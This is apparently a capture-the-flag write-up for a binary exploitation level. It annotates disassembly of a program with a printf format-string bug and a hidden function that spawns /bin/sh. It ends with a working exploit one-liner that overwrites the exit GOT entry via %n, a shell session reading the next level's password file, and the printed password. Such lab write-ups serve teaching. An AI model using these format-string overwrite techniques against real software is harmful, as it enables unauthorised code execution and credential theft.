
#### notes
```
8049854  m    : global variable m (useless here)
80484a4  o    : fn : called in n
80484c2  n    : fn : called in main
8048504  main : rak 3arf
```

#### 0x080484c2 : n() : disassembly
_`<0> -> <+3> : prepare stack frame for n function with size 536`_
```c
0x080484c2 <+0>:	push   ebp
0x080484c3 <+1>:	mov    ebp,esp
0x080484c5 <+3>:	sub    esp,0x218
```
_`<+9> -> <+35> : prepare arguments for fgets(str, size, stdin)`_
```c
0x080484cb <+9>:	mov    eax,ds:0x8049848 // stdin
0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax // esp+8 = stdin
0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200 // esp+4 = 512
0x080484dc <+26>:	lea    eax,[ebp-0x208] // char str[512]
0x080484e2 <+32>:	mov    DWORD PTR [esp],eax // esp = str
0x080484e5 <+35>:	call   0x80483a0 <fgets@plt> // fgets(str, 512, stdin)
```
_`<+40> -> <+49> : print the input from user taken by fgets`_
```c
0x080484ea <+40>:	lea    eax,[ebp-0x208] // eax = str
0x080484f0 <+46>:	mov    DWORD PTR [esp],eax // esp = *str
0x080484f3 <+49>:	call   0x8048380 <printf@plt> // printf(str)
```
_`<+54> -> <+61> : exit function`_
```c
0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```



#### 0x080484a4 : o() : disassembly
_`<+0> -> <+3> : init stack with size 24`_
```c
0x080484a4 <+0>:	push   ebp
0x080484a5 <+1>:	mov    ebp,esp
0x080484a7 <+3>:	sub    esp,0x18
```
_`<+6> -> <+13> : fork the shell with stystem call`_
```c
0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0 // "/bin/sh"
0x080484b1 <+13>:	call   0x80483b0 <system@plt> // system("/bin/sh")
```
_`<+18> -> <+25> : exit function`_
```c
0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
0x080484bd <+25>:	call   0x8048390 <_exit@plt>
```

---
#### Solution :
---

##### explanation of the exploit:

since the function `o` that calls the shell is not called in `n` function nor the main
so the idea here is : find a a vulnerability to call `o` from `n`
instead of exit the `n` we have to redirect it to execute the `o`
__how we will do that ?__ : 
- we have to overwrite the address where `<_exit@plt>` jumps (___global offset table___ __GOT__, search about it), to the address of `o` (_0x080484a4_)
ok lets start the process:

looking at the assembly of exit function inside the n function
```
(gdb) disass 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
   0x080483d6 <+6>:	push   0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
(gdb)
```
the exit function jumps into `0x8049838` 
we have to change the value the value of this address by the address of `o` ->`0x080484a4`
since we have only printf as a door to the exploit we will have to use the `%n` methode to write address into address
___what ?___
yes , simply we convert the address we want to change with to decimal 
in our case:
```
exit -> 0x8049838
o    -> 0x080484a4(hex) -> 134513828(decimal)
```

final exploit : 
```shell
(python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824d" + "%4$n"'; cat -) | ./level5

whoami
level6
pwd
/home/user/level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
